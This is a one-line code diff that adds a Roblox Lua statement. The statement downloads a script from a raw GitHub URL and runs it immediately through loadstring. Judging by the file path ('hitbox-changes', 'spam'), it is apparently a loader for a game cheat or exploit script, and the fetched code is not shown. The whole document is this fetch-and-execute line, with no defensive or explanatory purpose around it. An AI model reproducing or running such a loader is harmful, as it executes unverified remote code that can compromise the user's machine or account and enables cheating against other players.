@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/hitbox-changes-azure-latch-spam3-kg2juicclq3ybs.lua"))()
